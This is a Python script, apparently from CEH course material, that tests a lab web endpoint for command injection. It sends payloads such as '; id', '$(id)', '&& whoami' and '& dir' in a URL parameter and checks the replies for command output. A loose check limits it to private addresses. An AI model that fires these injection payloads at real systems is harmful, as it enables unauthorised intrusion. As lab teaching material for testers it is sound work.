#!/usr/bin/env python3
# LAB-ONLY: Command Injection Tester
# CEH v13 Master Module 14
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
import requests
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_TARGET_URL = "http://192.168.100.10/cmd.php?host="  # YOUR lab URL
LAB_CMD_INJECTION_PAYLOADS = [
    "; id",
    "&& id",
    "|| id",
    "| id",
    "`id`",  # Backtick injection
    "$(id)",  # Command substitution
    "; whoami",
    "; ls -la",
    "; uname -a",
    ";& echo LABTEST",
    "| echo LABTEST"
]
LAB_WINDOWS_PAYLOADS = [
    "& dir",
    "&& whoami",
    "| echo LABTEST",
    "; ipconfig"
]
LAB_CHECK_STR = "uid="  # Linux id command output; change to "Windows IP" for Windows
# -----------------------------------------------------------------------------------

def test_cmd_injection(url, payload, check_str):
    full_url = f"{url}{requests.utils.quote(payload)}"
    try:
        response = requests.get(full_url, timeout=10, verify=False)
        if check_str.lower() in response.text.lower():
            return True, response.text
        return False, response.text
    except Exception as e:
        return False, str(e)

def main():
    print("="*80)
    print("LAB-ONLY: Command Injection Tester")
    print("="*80)
    print(f"Target URL: {LAB_TARGET_URL}")
    print("Testing Linux payloads first...")
    print("-"*80)
    for payload in LAB_CMD_INJECTION_PAYLOADS:
        vulnerable, resp = test_cmd_injection(LAB_TARGET_URL, payload, LAB_CHECK_STR)
        status = "ðŸ”´ VULNERABLE" if vulnerable else "ðŸŸ¢ NOT Detected"
        print(f"Payload: {payload:<40} â†’ {status}")
        if vulnerable:
            print(f"   Output snippet: {resp[:200]}...")
    print("\nTesting Windows payloads...")
    for payload in LAB_WINDOWS_PAYLOADS:
        vulnerable, resp = test_cmd_injection(LAB_TARGET_URL, payload, "Windows")
        status = "ðŸ”´ VULNERABLE" if vulnerable else "ðŸŸ¢ NOT Detected"
        print(f"Payload: {payload:<40} â†’ {status}")

if __name__ == "__main__":
    if not any(prefix in LAB_TARGET_URL for prefix in ["10.", "172.16.", "172.17.", "172.18.", "172.19.", "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.", "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.", "192.168.", "localhost", "127.0.0.1"]):
        print("ERROR: LAB-ONLY! Use private lab targets!")
        sys.exit(1)
    import urllib3
    urllib3.disable_warnings()
    main()
